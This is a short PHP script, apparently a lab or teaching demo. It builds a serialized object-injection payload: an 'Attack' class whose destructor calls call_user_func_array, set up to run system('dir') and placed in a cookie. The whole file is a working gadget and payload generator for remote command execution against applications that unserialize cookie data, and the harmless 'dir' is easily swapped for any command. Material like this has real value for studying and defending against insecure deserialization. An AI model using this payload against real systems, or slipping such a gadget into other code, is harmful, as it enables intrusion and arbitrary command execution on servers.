<?php  // setcookie3.php

class Attack {
  private $func;
  private $args;
  public function __construct($func, $args) {
    $this->func = $func;
    $this->args = $args;
  }
  public function __destruct() {
    call_user_func_array($this->func, $this->args);
  }
}

header('Content-Type: text/plain; charset=Shift-JIS');
$attack = new Attack('system', ['dir']);
$serialized_atk = serialize($attack);
setcookie('serialized_atk', $serialized_atk);
echo str_replace("\0", '[nul]', $serialized_atk), PHP_EOL;